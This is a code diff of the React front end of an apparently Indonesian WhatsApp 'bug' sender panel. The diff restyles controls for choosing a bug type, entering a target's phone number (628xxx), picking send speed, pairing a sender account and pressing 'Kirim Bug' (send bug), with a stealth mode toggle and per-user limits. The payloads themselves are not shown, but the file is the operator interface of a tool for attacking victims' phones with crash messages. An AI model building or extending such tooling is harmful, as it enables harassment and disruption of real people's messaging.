-                <p className="text-lg font-bold text-yellow-400">{engineSpeed}</p>
-              </div>
-            </div>
-
-            {/* BUG TYPE NAVIGATION */}
-            <div className="glass rounded-2xl p-4 mb-4 border border-cyan-500/10">
-              <div className="flex items-center gap-2 mb-3">
-                <Bug className="w-4 h-4 text-cyan-400" />
-                <span className="text-xs text-gray-500 uppercase tracking-wider">Pilih Bug</span>
-              </div>
-              <div className="grid grid-cols-4 sm:grid-cols-8 gap-2">
-                {BUG_TYPES.map((bug, index) => {
-                  const Icon = bug.icon
-                  return (
-                    <button
-                      key={index}
-                      onClick={() => setActiveNav(index)}
-                      className={`p-3 rounded-xl flex flex-col items-center gap-1 transition-all ${
-                        activeNav === index
-                          ? `bg-gradient-to-br ${bug.color} shadow-lg scale-105`
-                          : 'bg-white/5 hover:bg-white/10'
-                      }`}
-                    >
-                      <Icon className={`w-5 h-5 ${activeNav === index ? 'text-white' : 'text-gray-400'}`} />
-                      <span className={`text-[8px] ${activeNav === index ? 'text-white' : 'text-gray-500'} uppercase truncate w-full text-center`}>
-                        {bug.name.replace('Bug ', '')}
-                      </span>
-                    </button>
-                  )
-                })}
-              </div>
-            </div>
-
-            {/* MAIN CONTROL */}
-            <div className="glass rounded-2xl p-4 sm:p-6 border border-cyan-500/10">
-              <div className="flex items-center gap-2 mb-4">
-                <Zap className="w-4 h-4 text-cyan-400" />
-                <span className="text-xs text-gray-500 uppercase tracking-wider">Control Panel</span>
-              </div>
-
-              <div className="space-y-3">
-                {/* Target Input */}
-                <div className="relative">
-                  <input
-                    type="text"
-                    placeholder="Masukin nomor target (628xxx)"
-                    value={targetNumber}
-                    onChange={(e) => setTargetNumber(e.target.value)}
-                    className="w-full px-4 py-3 pr-12 rounded-xl bg-[#0a1628]/80 border border-cyan-500/20 focus:border-cyan-400/50 outline-none text-white placeholder-gray-600 transition-all"
-                  />
-                  {targetNumber && (
-                    <button
-                      onClick={copyToClipboard}
-                      className="absolute right-3 top-1/2 -translate-y-1/2 p-1.5 rounded-lg hover:bg-white/10 transition-all"
-                    >
-                      {isCopied ? <CheckCircle2 className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4 text-gray-500" />}
-                    </button>
-                  )}
+              <div className="bg-gradient-to-b from-[#1a203f]/90 to-[#12162d]/90 backdrop-blur-md rounded-[30px] p-6 shadow-2xl relative border border-white/5 mb-6">
+                <div className="flex justify-center mb-4">{BUG_TYPES[activeNav].icon}</div>
+                <div className="flex justify-between items-center mb-8 px-2">
+                  <button onClick={() => setActiveNav(prev => (prev - 1 + BUG_TYPES.length) % BUG_TYPES.length)} className="w-8 h-8 bg-black/60 rounded-full flex items-center justify-center"><ChevronLeft size={20}/></button>
+                  <h2 className="text-xl font-black text-white italic tracking-wider text-center">{BUG_TYPES[activeNav].name}</h2>
+                  <button onClick={() => setActiveNav(prev => (prev + 1) % BUG_TYPES.length)} className="w-8 h-8 bg-black/60 rounded-full flex items-center justify-center"><ChevronRight size={20}/></button>
                 </div>
 
-                {/* Engine Speed Selector */}
-                <div className="flex gap-2">
-                  {["Instant", "Fast", "Normal"].map((speed) => (
-                    <button
-                      key={speed}
-                      onClick={() => setEngineSpeed(speed)}
-                      className={`flex-1 py-2 rounded-xl text-xs font-bold uppercase tracking-wider transition-all ${
-                        engineSpeed === speed
-                          ? 'bg-gradient-to-r from-cyan-500 to-blue-600 text-white shadow-lg shadow-cyan-500/20'
-                          : 'bg-white/5 text-gray-400 hover:bg-white/10'
-                      }`}
-                    >
-                      {speed}
-                    </button>
-                  ))}
-                </div>
-
-                {/* Sender Mode */}
-                <div className="flex gap-2">
-                  <button
-                    onClick={() => setSenderType("global")}
-                    className={`flex-1 py-2 rounded-xl text-xs font-bold uppercase tracking-wider transition-all ${
-                      senderType === "global"
-                        ? 'bg-gradient-to-r from-green-500 to-emerald-600 text-white shadow-lg shadow-green-500/20'
-                        : 'bg-white/5 text-gray-400 hover:bg-white/10'
-                    }`}
-                  >
-                    Global ({bugLimit})
-                  </button>
-                  <button
-                    onClick={() => setSenderType("pribadi")}
-                    className={`flex-1 py-2 rounded-xl text-xs font-bold uppercase tracking-wider transition-all ${
-                      senderType === "pribadi"
-                        ? 'bg-gradient-to-r from-purple-500 to-pink-600 text-white shadow-lg shadow-purple-500/20'
-                        : 'bg-white/5 text-gray-400 hover:bg-white/10'
-                    }`}
-                  >
-                    Pribadi ({pribadiLimit})
-                  </button>
-                </div>
-
-                {/* Pribadi Settings */}
-                {senderType === "pribadi" && (
-                  <div className="p-3 rounded-xl bg-white/5 border border-purple-500/20 space-y-2">
-                    <input
-                      type="text"
-                      placeholder="Nomor sender kamu"
-                      value={senderNumber}
-                      onChange={(e) => setSenderNumber(e.target.value)}
-                      className="w-full px-3 py-2 rounded-lg bg-[#0a1628]/80 border border-purple-500/20 outline-none text-white placeholder-gray-600 text-sm"
-                    />
-                    <button
-                      onClick={handleRequestPairing}
-                      disabled={pairingStatus === "loading"}
-                      className="w-full py-2 rounded-lg bg-gradient-to-r from-purple-500 to-pink-600 text-white text-xs font-bold uppercase tracking-wider hover:shadow-lg hover:shadow-purple-500/20 transition-all disabled:opacity-50"
-                    >
-                      {pairingStatus === "loading" ? "Meminta Kode..." : pairingStatus === "success" ? `Pairing: ${receivedCode}` : "Pairing Sender"}
-                    </button>
-                    {pairingStatus === "loading" && (
-                      <div className="flex items-center gap-2 text-xs text-yellow-400">
-                        <Loader2 className="w-3 h-3 animate-spin" />
-                        Tunggu kode pairing dari bot...
-                      </div>
-                    )}
+                <div className="flex justify-between gap-3">
+                  <div className="flex-1 bg-[#0a0d1e] rounded-2xl py-4 flex flex-col items-center justify-center">
+                    {userRole === "admin" ? <Infinity className="w-8 h-8 text-[#00e5ff]" /> : <span className="text-3xl font-bold text-[#00e5ff]">{senderType === 'pribadi' ? pribadiLimit : bugLimit}</span>}
+                    <span className="text-[10px] font-bold text-gray-500 tracking-widest">LIMIT</span>
                   </div>
-                )}
+                  <div className="flex-1 bg-[#0a0d1e] rounded-2xl py-4 flex flex-col items-center justify-center">
+                    <span className={`text-2xl font-black ${currentStatus.color}`}>{userRole === 'admin' ? 'ACT' : currentStatus.text}</span>
+                    <span className="text-[10px] font-bold text-gray-500 tracking-widest">STATUS</span>
+                  </div>
+                  <div className="flex-1 bg-[#0a0d1e] rounded-2xl py-4 flex flex-col items-center justify-center">
+                    <span className="text-3xl font-bold text-white">{onlineUsers}</span>
+                    <span className="text-[10px] font-bold text-gray-500 tracking-widest">ONLINE</span>
+                  </div>
+                </div>
+              </div>
 
-                {/* SEND BUTTON */}
-                <button
-                  onClick={handleSendBug}
-                  disabled={isSending || !targetNumber || (senderType === "pribadi" && !isSenderPaired)}
-                  className="w-full py-4 rounded-xl bg-gradient-to-r from-red-600 to-red-800 text-white font-bold text-sm uppercase tracking-wider hover:shadow-lg hover:shadow-red-500/30 transition-all disabled:opacity-30 disabled:cursor-not-allowed"
-                >
-                  {isSending ? (
-                    <span className="flex items-center justify-center gap-2">
-                      <Loader2 className="w-4 h-4 animate-spin" />
-                      PROCESSING...
-                    </span>
-                  ) : (
-                    <span className="flex items-center justify-center gap-2">
-                      <Skull className="w-5 h-5" />
-                      Kirim Bug
-                    </span>
-                  )}
+              <div className="relative mb-6">
+                <input value={targetNumber} onChange={(e) => setTargetNumber(e.target.value)} className="w-full bg-black/60 border-white/10 p-5 rounded-2xl text-center font-black italic text-lg text-cyan-400 outline-none" placeholder="628XXXXXXXX" />
+                <button onClick={copyToClipboard} className="absolute right-5 top-1/2 -translate-y-1/2 text-white/40"><Copy size={24} /></button>
+              </div>
+
+              <button onClick={handleSendBug} className="w-full py-5 bg-gradient-to-r from-pink-600 via-red-600 to-orange-600 rounded-[2.5rem] font-black uppercase italic text-xs text-white">KIRIM BUG</button>
+
+              <div className="flex gap-3 mt-6 mb-2">
+                <button onClick={() => setSenderType('pribadi')} className={`flex-1 flex flex-col items-center py-4 rounded-2xl ${senderType === 'pribadi' ? 'bg-[#00e5ff] text-black' : 'bg-[#151b3b]/80'}`}>
+                  <h2 className="text-sm font-bold">Pribadi</h2>
+                  <p className="text-[9px]">{isSenderPaired ? '✓ Terkait' : '✗ Kosong'}</p>
+                </button>
+                <button onClick={() => setSenderType('global')} className={`flex-1 flex flex-col items-center py-4 rounded-2xl ${senderType === 'global' ? 'bg-[#00e5ff] text-black' : 'bg-[#111322]/80'}`}>
+                  <h2 className="text-sm font-bold">Global</h2>
+                  <p className="text-[9px]">1 sender</p>
                 </button>
               </div>
-            </div>
-          </div>
-        )}
 
-        {/* BOTTOM NAV */}
-        {isLoggedIn && (
-          <div className="fixed bottom-8 left-4 right-4 z-20">
-            <div className="glass-strong rounded-2xl p-2 flex justify-around border border-white/10 shadow-2xl max-w-md mx-auto">
-              <button
-                onClick={() => setCurrentView('dashboard')}
-                className={`p-3 rounded-xl transition-all ${currentView === 'dashboard' ? 'text-cyan-400 bg-cyan-500/10' : 'text-white/30 hover:text-white/50'}`}
-              >
-                <LayoutDashboard size={22} />
-              </button>
-              <button
-                onClick={() => setCurrentView('settings')}
-                className={`p-3 rounded-xl transition-all ${currentView === 'settings' ? 'text-cyan-400 bg-cyan-500/10' : 'text-white/30 hover:text-white/50'}`}
-              >
-                <Settings size={22} />
-              </button>
-              <button
-                onClick={() => {
-                  setIsLoggedIn(false)
-                  setUsername("")
-                  setPassword("")
-                }}
-                className="p-3 rounded-xl text-red-400 hover:bg-red-500/10 transition-all"
-              >
-                <LogOut size={22} />
-              </button>
+              {senderType === "pribadi" && (
+                <div className="bg-white/5 border border-white/10 rounded-2xl p-4 mt-2">
+                  <input value={senderNumber} onChange={(e) => setSenderNumber(e.target.value)} className="w-full bg-black/80 border p-3 rounded-xl text-center text-xs text-cyan-400 font-bold" placeholder="NOMOR SENDER (628...)" />
+                  <button onClick={handleRequestPairing} className="w-full py-3 bg-[#00e5ff] text-black rounded-xl font-black text-xs uppercase mt-2">REQUEST PAIRING</button>
+                </div>
+              )}
             </div>
+          ) : (
+            <div className="space-y-5">
+              <h2 className="text-lg font-black italic uppercase border-b border-white/10 pb-4 text-cyan-400">Setting {userRole === "admin" ? "Leo (Owner)" : "Selz"}</h2>
+              <div className="bg-white/5 p-6 rounded-[2.5rem]">
+                <div className="flex gap-2">
+                  {["Normal", "Fast", "Instant"].map((speed) => (
+                    <button key={speed} onClick={() => setEngineSpeed(speed)} className={`flex-1 py-4 rounded-2xl text-[9px] font-black border ${engineSpeed === speed ? 'bg-cyan-500 text-black' : 'bg-black/40 text-white/40'}`}>{speed}</button>
+                  ))}
+                </div>
+              </div>
+              <div className="flex items-center justify-between bg-white/5 p-6 rounded-[2.5rem]">
+                <span className="text-xs font-black uppercase italic">Stealth Mode</span>
+                <button onClick={() => setIsStealth(!isStealth)} className={`w-14 h-7 rounded-full relative ${isStealth ? 'bg-cyan-500' : 'bg-white/10'}`}><div className={`absolute top-1 w-5 h-5 rounded-full bg-white ${isStealth ? 'right-1' : 'left-1'}`}></div></button>
+              </div>
+              <div className="flex items-center justify-between bg-white/5 p-6 rounded-[2.5rem]">
+                <span className="text-xs font-black uppercase italic">Audio Output</span>
+                <button onClick={() => setIsMusicOn(!isMusicOn)} className="p-3 rounded-2xl bg-cyan-500 text-black">{isMusicOn ? ( <Volume2 size={20}/> ) : ( <VolumeX size={20}/>)}</button>
+              </div>
+              <button onClick={() => { setIsLoggedIn(false); setUsername(""); setPassword(""); }} className="w-full py-6 bg-red-600/10 rounded-[2.5rem] text-xs font-black uppercase text-red-500">LOG OUT</button>
+            </div>
+          )}
+
+          <div className="fixed bottom-8 left-16 right-16 bg-[#0a1628]/95 border border-white/10 p-4 rounded-[2.5rem] flex justify-around z-20">
+            <button onClick={() => setCurrentView('dashboard')} className={`p-1 ${currentView === 'dashboard' ? 'text-cyan-400' : 'text-white/20'}`}><LayoutDashboard size={22}/></button>
+            <button onClick={() => setCurrentView('settings')} className={`p-1 ${currentView === 'settings' ? 'text-cyan-400' : 'text-white/20'}`}><Settings size={22}/></button>
           </div>
-        )}
-      </div>
+        </div>
+      )}
     </div>
   )
-      }
+    }
